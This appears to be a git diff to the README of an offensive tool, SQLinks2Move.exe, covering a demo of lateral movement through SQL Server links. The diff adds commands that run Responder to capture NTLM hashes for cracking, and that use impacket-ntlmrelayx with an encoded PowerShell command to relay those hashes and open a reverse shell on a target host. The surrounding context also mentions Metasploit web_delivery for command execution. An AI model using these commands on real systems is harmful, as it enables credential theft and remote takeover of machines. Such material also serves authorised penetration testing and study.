@@ -60,13 +60,19 @@ We can do command execution, so for example, using web_delivery metasploit modul
 
 ## Demo - NTLM Hashes.
 
-By setting up responder, and specifying your LHOST when prompted by SQLinks2Move.exe, we can retreive NTLM hash and attempt to crack it.
+By setting up responder with ```sudo responder -I [interface]```, and specifying your LHOST when prompted by SQLinks2Move.exe, we can retreive NTLM hash and attempt to crack it.
 
 ![step 3](https://user-images.githubusercontent.com/22322762/120856039-83f01580-c57f-11eb-97ea-9fff9da2ddb4.png)
 
 Alternatively we can setup impacket-ntlmrelayx and execute a command to get a reverse shell if the target is vulnerable.
 
-TODO : Screenshot
+For example using :
+
+```bash
+sudo impacket-ntlmrelayx --no-http-server -smb2support -t [PIZZA03_ip_address] -c 'powershell -enc <base64>'
+```
+
+TODO : Screenshot of impacket-ntlmrelayx
 
 
 
